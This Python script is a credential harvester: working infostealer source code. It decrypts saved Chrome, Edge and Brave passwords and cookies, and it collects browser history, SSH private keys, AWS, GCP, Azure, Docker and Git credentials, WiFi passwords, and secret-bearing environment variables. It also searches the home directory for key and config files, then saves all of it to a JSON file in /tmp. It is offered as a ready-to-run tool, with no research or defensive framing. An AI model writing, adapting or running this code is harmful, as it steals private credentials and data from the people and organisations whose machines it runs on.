#!/usr/bin/env python3
"""
CREDENTIAL HARVESTER - Collects passwords, cookies, tokens, SSH keys, browser data.
Supports: Chrome, Firefox, Edge, Safari, SSH, AWS, GCP, Azure, Docker, etc.
"""

import os
import sys
import json
import time
import base64
import shutil
import sqlite3
import platform
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional
from datetime import datetime

# Cross-platform crypto for browser decryption
try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

class CredentialHarvester:
    """Harvests credentials from browsers, SSH, cloud CLI, etc."""
    
    def __init__(self):
        self.platform = platform.system().lower()
        self.home = Path.home()
        self.results = {
            "browser_passwords": [],
            "browser_cookies": [],
            "browser_history": [],
            "browser_autofill": [],
            "ssh_keys": [],
            "ssh_known_hosts": [],
            "aws_credentials": [],
            "gcp_credentials": [],
            "azure_credentials": [],
            "docker_credentials": [],
            "git_credentials": [],
            "env_secrets": [],
            "wifi_passwords": [],
            "custom_files": []
        }
        
    # ─── BROWSER PASSWORD HARVESTING ─────────────────────────────────────
    
    def _get_chrome_key(self) -> Optional[bytes]:
        """Get Chrome encryption key (Windows only, uses DPAPI)."""
        if self.platform != "windows":
            return None
            
        try:
            import win32crypt
            
            # Chrome local state file
            local_state = Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data/Local State"
            if not local_state.exists():
                return None
                
            with open(local_state, 'r') as f:
                data = json.load(f)
            
            encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
            # Remove DPAPI prefix
            encrypted_key = encrypted_key[5:]
            # Decrypt with DPAPI
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except:
            return None
    
    def _decrypt_chrome_password(self, encrypted: bytes, key: bytes = None) -> str:
        """Decrypt Chrome password (v80+ uses AES-GCM)."""
        try:
            if encrypted[:3] == b'v10' or encrypted[:3] == b'v11':
                # Chrome v80+ AES-GCM encryption
                if not CRYPTO_AVAILABLE or not key:
                    return "[ENCRYPTED - need pycryptodome]"
                    
                nonce = encrypted[3:15]
                ciphertext = encrypted[15:-16]
                tag = encrypted[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            else:
                # Old Chrome (DPAPI on Windows)
                if self.platform == "windows":
                    import win32crypt
                    return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
                return "[LEGACY_ENCRYPTED]"
        except:
            return "[DECRYPT_FAILED]"
    
    def harvest_chrome_passwords(self) -> List[Dict]:
        """Harvest passwords from Chrome/Chromium browsers."""
        passwords = []
        
        # Chrome paths by platform
        chrome_paths = {
            "windows": [
                Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data",
                Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome Beta/User Data",
                Path(os.environ.get("LOCALAPPDATA", "")) / "Chromium/User Data",
                Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft/Edge/User Data",
                Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware/Brave-Browser/User Data",
                Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi/User Data",
            ],
            "linux": [
                self.home / ".config/google-chrome",
                self.home / ".config/chromium",
                self.home / ".config/microsoft-edge",
                self.home / ".config/brave",
                self.home / ".config/vivaldi",
            ],
            "darwin": [
                self.home / "Library/Application Support/Google/Chrome",
                self.home / "Library/Application Support/Chromium",
                self.home / "Library/Application Support/Microsoft Edge",
                self.home / "Library/Application Support/BraveSoftware/Brave-Browser",
            ]
        }
        
        key = self._get_chrome_key() if self.platform == "windows" else None
        
        for chrome_path in chrome_paths.get(self.platform, []):
            if not chrome_path.exists():
                continue
                
            # Check all profiles
            for profile in chrome_path.glob("*"):
                if not profile.is_dir() or profile.name in ["System Profile", "Snapshots"]:
                    continue
                    
                login_db = profile / "Login Data"
                if not login_db.exists():
                    continue
                
                try:
                    # Copy database to temp (Chrome locks it)
                    temp_db = Path(f"/tmp/chrome_login_{time.time()}.db")
                    shutil.copy2(login_db, temp_db)
                    
                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, username, encrypted_pw in cursor.fetchall():
                        if encrypted_pw:
                            decrypted = self._decrypt_chrome_password(encrypted_pw, key)
                            passwords.append({
                                "browser": chrome_path.name,
                                "profile": profile.name,
                                "url": url,
                                "username": username,
                                "password": decrypted
                            })
                    
                    conn.close()
                    temp_db.unlink(missing_ok=True)
                    
                except Exception as e:
                    pass
        
        self.results["browser_passwords"] = passwords
        return passwords
    
    def harvest_firefox_passwords(self) -> List[Dict]:
        """Harvest passwords from Firefox."""
        passwords = []
        
        firefox_paths = {
            "windows": [Path(os.environ.get("APPDATA", "")) / "Mozilla/Firefox/Profiles"],
            "linux": [self.home / ".mozilla/firefox"],
            "darwin": [self.home / "Library/Application Support/Firefox/Profiles"],
        }
        
        for ff_path in firefox_paths.get(self.platform, []):
            if not ff_path.exists():
                continue
                
            for profile in ff_path.glob("*.default*"):
                logins_json = profile / "logins.json"
                if logins_json.exists():
                    try:
                        with open(logins_json, 'r') as f:
                            data = json.load(f)
                        
                        # Firefox uses logins.json with encrypted passwords
                        # Need to decrypt with key4.db
                        for login in data.get("logins", []):
                            passwords.append({
                                "browser": "firefox",
                                "url": login.get("hostname", ""),
                                "username": login.get("username", ""),
                                "password": "[FIREFOX_ENCRYPTED]",  # Would need key4.db decryption
                            })
                    except:
                        pass
        
        self.results["browser_passwords"].extend(passwords)
        return passwords
    
    # ─── BROWSER COOKIES ────────────────────────────────────────────────
    
    def harvest_chrome_cookies(self, domains: List[str] = None) -> List[Dict]:
        """Harvest cookies from Chrome/Chromium browsers."""
        cookies = []
        
        chrome_paths = {
            "windows": [Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data"],
            "linux": [self.home / ".config/google-chrome", self.home / ".config/chromium"],
            "darwin": [self.home / "Library/Application Support/Google/Chrome"],
        }
        
        key = self._get_chrome_key() if self.platform == "windows" else None
        
        for chrome_path in chrome_paths.get(self.platform, []):
            if not chrome_path.exists():
                continue
                
            for profile in chrome_path.glob("*"):
                if not profile.is_dir() or profile.name in ["System Profile", "Snapshots"]:
                    continue
                    
                cookies_db = profile / "Cookies"
                if not cookies_db.exists():
                    continue
                
                try:
                    temp_db = Path(f"/tmp/chrome_cookies_{time.time()}.db")
                    shutil.copy2(cookies_db, temp_db)
                    
                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    
                    query = "SELECT host_key, name, value, encrypted_value, path, expires_utc FROM cookies"
                    if domains:
                        placeholders = ",".join("?" * len(domains))
                        query += f" WHERE host_key IN ({placeholders})"
                        cursor.execute(query, domains)
                    else:
                        cursor.execute(query)
                    
                    for host, name, value, encrypted, path, expires in cursor.fetchall():
                        cookie_value = value if value else self._decrypt_chrome_password(encrypted, key)
                        
                        cookies.append({
                            "browser": chrome_path.name,
                            "profile": profile.name,
                            "domain": host,
                            "name": name,
                            "value": cookie_value[:500] if cookie_value else "",
                            "path": path
                        })
                    
                    conn.close()
                    temp_db.unlink(missing_ok=True)
                    
                except:
                    pass
        
        self.results["browser_cookies"] = cookies
        return cookies
    
    # ─── BROWSER HISTORY ────────────────────────────────────────────────
    
    def harvest_chrome_history(self, limit: int = 1000) -> List[Dict]:
        """Harvest browsing history from Chrome/Chromium."""
        history = []
        
        chrome_paths = {
            "windows": [Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data"],
            "linux": [self.home / ".config/google-chrome", self.home / ".config/chromium"],
            "darwin": [self.home / "Library/Application Support/Google/Chrome"],
        }
        
        for chrome_path in chrome_paths.get(self.platform, []):
            if not chrome_path.exists():
                continue
                
            for profile in chrome_path.glob("*"):
                if not profile.is_dir():
                    continue
                    
                history_db = profile / "History"
                if not history_db.exists():
                    continue
                
                try:
                    temp_db = Path(f"/tmp/chrome_history_{time.time()}.db")
                    shutil.copy2(history_db, temp_db)
                    
                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    cursor.execute(f"""
                        SELECT urls.url, urls.title, visits.visit_time 
                        FROM urls, visits 
                        WHERE urls.id = visits.url 
                        ORDER BY visits.visit_time DESC 
                        LIMIT {limit}
                    """)
                    
                    for url, title, visit_time in cursor.fetchall():
                        history.append({
                            "browser": chrome_path.name,
                            "url": url,
                            "title": title,
                            "timestamp": visit_time
                        })
                    
                    conn.close()
                    temp_db.unlink(missing_ok=True)
                    
                except:
                    pass
        
        self.results["browser_history"] = history
        return history
    
    # ─── SSH KEYS ───────────────────────────────────────────────────────
    
    def harvest_ssh_keys(self) -> List[Dict]:
        """Harvest SSH private keys and known hosts."""
        keys = []
        
        ssh_dir = self.home / ".ssh"
        if not ssh_dir.exists():
            return keys
        
        # Private keys
        key_files = ["id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_rsa_github", "id_rsa_aws"]
        for key_file in key_files:
            key_path = ssh_dir / key_file
            if key_path.exists():
                try:
                    with open(key_path, 'r') as f:
                        key_content = f.read()
                    
                    keys.append({
                        "type": "private_key",
                        "filename": key_file,
                        "content": key_content
                    })
                except:
                    pass
        
        # Known hosts
        known_hosts = ssh_dir / "known_hosts"
        if known_hosts.exists():
            try:
                with open(known_hosts, 'r') as f:
                    hosts = f.read()
                keys.append({
                    "type": "known_hosts",
                    "content": hosts
                })
            except:
                pass
        
        # SSH config
        ssh_config = ssh_dir / "config"
        if ssh_config.exists():
            try:
                with open(ssh_config, 'r') as f:
                    config = f.read()
                keys.append({
                    "type": "ssh_config",
                    "content": config
                })
            except:
                pass
        
        self.results["ssh_keys"] = keys
        return keys
    
    # ─── CLOUD CREDENTIALS ──────────────────────────────────────────────
    
    def harvest_aws_credentials(self) -> List[Dict]:
        """Harvest AWS credentials from ~/.aws/ and env vars."""
        creds = []
        
        # AWS credentials file
        aws_creds = self.home / ".aws" / "credentials"
        if aws_creds.exists():
            try:
                with open(aws_creds, 'r') as f:
                    content = f.read()
                creds.append({
                    "source": "credentials_file",
                    "content": content
                })
            except:
                pass
        
        # AWS config
        aws_config = self.home / ".aws" / "config"
        if aws_config.exists():
            try:
                with open(aws_config, 'r') as f:
                    content = f.read()
                creds.append({
                    "source": "config_file",
                    "content": content
                })
            except:
                pass
        
        # Environment variables
        aws_env_keys = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", 
                        "AWS_DEFAULT_REGION", "AWS_REGION"]
        env_creds = {}
        for key in aws_env_keys:
            if os.environ.get(key):
                env_creds[key] = os.environ[key]
        
        if env_creds:
            creds.append({
                "source": "environment",
                "credentials": env_creds
            })
        
        self.results["aws_credentials"] = creds
        return creds
    
    def harvest_gcp_credentials(self) -> List[Dict]:
        """Harvest GCP credentials."""
        creds = []
        
        # gcloud config
        gcloud_dir = self.home / ".config" / "gcloud"
        if gcloud_dir.exists():
            # Application default credentials
            adc = gcloud_dir / "application_default_credentials.json"
            if adc.exists():
                try:
                    with open(adc, 'r') as f:
                        content = f.read()
                    creds.append({
                        "source": "application_default_credentials",
                        "content": content
                    })
                except:
                    pass
            
            # Legacy credentials
            legacy = gcloud_dir / "credentials"
            if legacy.exists():
                try:
                    with open(legacy, 'r') as f:
                        content = f.read()
                    creds.append({
                        "source": "legacy_credentials",
                        "content": content
                    })
                except:
                    pass
        
        # Environment variables
        gcp_env_keys = ["GOOGLE_APPLICATION_CREDENTIALS", "GCP_PROJECT", "GCLOUD_PROJECT"]
        env_creds = {}
        for key in gcp_env_keys:
            if os.environ.get(key):
                env_creds[key] = os.environ[key]
        
        if env_creds:
            creds.append({
                "source": "environment",
                "credentials": env_creds
            })
        
        self.results["gcp_credentials"] = creds
        return creds
    
    def harvest_azure_credentials(self) -> List[Dict]:
        """Harvest Azure credentials."""
        creds = []
        
        # Azure CLI
        azure_dir = self.home / ".azure"
        if azure_dir.exists():
            for cred_file in ["accessTokens.json", "azureProfile.json", "config"]:
                cred_path = azure_dir / cred_file
                if cred_path.exists():
                    try:
                        with open(cred_path, 'r') as f:
                            content = f.read()
                        creds.append({
                            "source": f"azure_cli_{cred_file}",
                            "content": content
                        })
                    except:
                        pass
        
        # Environment variables
        azure_env_keys = ["AZURE_SUBSCRIPTION_ID", "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET",
                         "AZURE_TENANT_ID", "AZURE_STORAGE_KEY"]
        env_creds = {}
        for key in azure_env_keys:
            if os.environ.get(key):
                env_creds[key] = os.environ[key]
        
        if env_creds:
            creds.append({
                "source": "environment",
                "credentials": env_creds
            })
        
        self.results["azure_credentials"] = creds
        return creds
    
    # ─── DOCKER & GIT ───────────────────────────────────────────────────
    
    def harvest_docker_credentials(self) -> List[Dict]:
        """Harvest Docker registry credentials."""
        creds = []
        
        docker_config = self.home / ".docker" / "config.json"
        if docker_config.exists():
            try:
                with open(docker_config, 'r') as f:
                    content = f.read()
                creds.append({
                    "source": "docker_config",
                    "content": content
                })
            except:
                pass
        
        self.results["docker_credentials"] = creds
        return creds
    
    def harvest_git_credentials(self) -> List[Dict]:
        """Harvest Git credentials."""
        creds = []
        
        # Git credential store
        git_creds = self.home / ".git-credentials"
        if git_creds.exists():
            try:
                with open(git_creds, 'r') as f:
                    content = f.read()
                creds.append({
                    "source": "git-credentials",
                    "content": content
                })
            except:
                pass
        
        # Git config
        git_config = self.home / ".gitconfig"
        if git_config.exists():
            try:
                with open(git_config, 'r') as f:
                    content = f.read()
                creds.append({
                    "source": "gitconfig",
                    "content": content
                })
            except:
                pass
        
        self.results["git_credentials"] = creds
        return creds
    
    # ─── WIFI PASSWORDS ────────────────────────────────────────────────
    
    def harvest_wifi_passwords(self) -> List[Dict]:
        """Harvest saved WiFi passwords."""
        passwords = []
        
        if self.platform == "windows":
            try:
                # Get WiFi profiles
                result = subprocess.run(
                    ["netsh", "wlan", "show", "profiles"],
                    capture_output=True, text=True
                )
                
                profiles = []
                for line in result.stdout.split('\n'):
                    if "All User Profile" in line:
                        profile = line.split(':')[1].strip()
                        profiles.append(profile)
                
                # Get passwords for each profile
                for profile in profiles:
                    result = subprocess.run(
                        ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                        capture_output=True, text=True
                    )
                    
                    for line in result.stdout.split('\n'):
                        if "Key Content" in line:
                            pw = line.split(':')[1].strip()
                            passwords.append({
                                "ssid": profile,
                                "password": pw
                            })
            except:
                pass
        
        elif self.platform == "linux":
            # NetworkManager
            nm_dir = Path("/etc/NetworkManager/system-connections")
            if nm_dir.exists():
                for conn_file in nm_dir.glob("*"):
                    try:
                        with open(conn_file, 'r') as f:
                            content = f.read()
                        passwords.append({
                            "source": str(conn_file),
                            "content": content
                        })
                    except:
                        pass
        
        elif self.platform == "darwin":
            # macOS - need keychain access
            try:
                result = subprocess.run(
                    ["security", "find-generic-password", "-wa", "AirPortNetwork"],
                    capture_output=True, text=True
                )
                if result.returncode == 0:
                    passwords.append({
                        "source": "keychain",
                        "password": result.stdout.strip()
                    })
            except:
                pass
        
        self.results["wifi_passwords"] = passwords
        return passwords
    
    # ─── ENVIRONMENT SECRETS ───────────────────────────────────────────
    
    def harvest_env_secrets(self) -> List[Dict]:
        """Harvest secrets from environment variables."""
        secrets = []
        
        secret_patterns = [
            "API_KEY", "SECRET", "PASSWORD", "TOKEN", "AUTH", "CREDENTIAL",
            "PRIVATE", "KEY", "ACCESS", "SESSION", "BEARER", "JWT",
            "DATABASE_URL", "DB_PASSWORD", "REDIS_URL", "MONGO_URL",
            "SLACK", "DISCORD", "TELEGRAM", "TWILIO", "STRIPE",
            "GITHUB_TOKEN", "GITLAB_TOKEN", "BITBUCKET",
            "HEROKU", "VERCEL", "NETLIFY", "DIGITALOCEAN"
        ]
        
        for key, value in os.environ.items():
            key_upper = key.upper()
            if any(pattern in key_upper for pattern in secret_patterns):
                secrets.append({
                    "key": key,
                    "value": value[:100] + "..." if len(value) > 100 else value
                })
        
        self.results["env_secrets"] = secrets
        return secrets
    
    # ─── CUSTOM FILE SEARCH ────────────────────────────────────────────
    
    def search_sensitive_files(self, patterns: List[str] = None, max_depth: int = 3) -> List[Dict]:
        """Search for sensitive files by pattern."""
        if not patterns:
            patterns = [
                "*.pem", "*.key", "*.p12", "*.pfx", "*.crt",
                "*credential*", "*password*", "*secret*", "*token*",
                "*.env", ".env", "*.cfg", "*.conf", "*.ini",
                "id_rsa*", "*.ppk", "*.ovpn",
                "*.sqlite", "*.db", "*.json"
            ]
        
        files = []
        search_dirs = [self.home, Path("/tmp"), Path("/var/www") if Path("/var/www").exists() else None]
        
        for search_dir in search_dirs:
            if not search_dir or not search_dir.exists():
                continue
            
            for pattern in patterns:
                try:
                    for found_file in search_dir.rglob(pattern):
                        if found_file.is_file() and found_file.stat().st_size < 10_000_000:  # Max 10MB
                            try:
                                with open(found_file, 'r', errors='ignore') as f:
                                    content = f.read(5000)  # First 5KB
                                files.append({
                                    "path": str(found_file),
                                    "size": found_file.stat().st_size,
                                    "content": content
                                })
                            except:
                                pass
                except:
                    pass
        
        self.results["custom_files"] = files[:100]  # Limit
        return files[:100]
    
    # ─── MASTER HARVEST ────────────────────────────────────────────────
    
    def harvest_all(self) -> Dict[str, Any]:
        """Run all harvesters and return consolidated results."""
        
        print("[*] Starting credential harvest...")
        
        # Browser credentials
        print("[*] Harvesting browser passwords...")
        self.harvest_chrome_passwords()
        self.harvest_firefox_passwords()
        
        print("[*] Harvesting browser cookies...")
        self.harvest_chrome_cookies()
        
        print("[*] Harvesting browser history...")
        self.harvest_chrome_history()
        
        # SSH
        print("[*] Harvesting SSH keys...")
        self.harvest_ssh_keys()
        
        # Cloud
        print("[*] Harvesting AWS credentials...")
        self.harvest_aws_credentials()
        
        print("[*] Harvesting GCP credentials...")
        self.harvest_gcp_credentials()
        
        print("[*] Harvesting Azure credentials...")
        self.harvest_azure_credentials()
        
        # Dev tools
        print("[*] Harvesting Docker credentials...")
        self.harvest_docker_credentials()
        
        print("[*] Harvesting Git credentials...")
        self.harvest_git_credentials()
        
        # Network
        print("[*] Harvesting WiFi passwords...")
        self.harvest_wifi_passwords()
        
        # Environment
        print("[*] Harvesting environment secrets...")
        self.harvest_env_secrets()
        
        # Files
        print("[*] Searching for sensitive files...")
        self.search_sensitive_files()
        
        # Summary
        summary = {
            "timestamp": datetime.now().isoformat(),
            "platform": self.platform,
            "hostname": platform.node(),
            "summary": {
                "browser_passwords": len(self.results["browser_passwords"]),
                "browser_cookies": len(self.results["browser_cookies"]),
                "browser_history": len(self.results["browser_history"]),
                "ssh_keys": len(self.results["ssh_keys"]),
                "aws_credentials": len(self.results["aws_credentials"]),
                "gcp_credentials": len(self.results["gcp_credentials"]),
                "azure_credentials": len(self.results["azure_credentials"]),
                "docker_credentials": len(self.results["docker_credentials"]),
                "git_credentials": len(self.results["git_credentials"]),
                "wifi_passwords": len(self.results["wifi_passwords"]),
                "env_secrets": len(self.results["env_secrets"]),
                "custom_files": len(self.results["custom_files"])
            },
            "data": self.results
        }
        
        total = sum(summary["summary"].values())
        print(f"[*] Harvest complete: {total} items collected")
        
        return summary
    
    def to_json(self, indent: int = 2) -> str:
        """Export results to JSON."""
        return json.dumps(self.results, indent=indent, default=str)
    
    def save_to_file(self, filepath: str = None) -> str:
        """Save results to file."""
        if not filepath:
            filepath = f"/tmp/credentials_{int(time.time())}.json"
        
        with open(filepath, 'w') as f:
            f.write(self.to_json())
        
        return filepath


# ─── CLI Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    harvester = CredentialHarvester()
    results = harvester.harvest_all()
    
    # Save to file
    output_file = harvester.save_to_file()
    print(f"\n[*] Results saved to: {output_file}")
    
    # Print summary
    print("\n=== HARVEST SUMMARY ===")
    for category, count in results["summary"].items():
        if count > 0:
            print(f"  {category}: {count}")
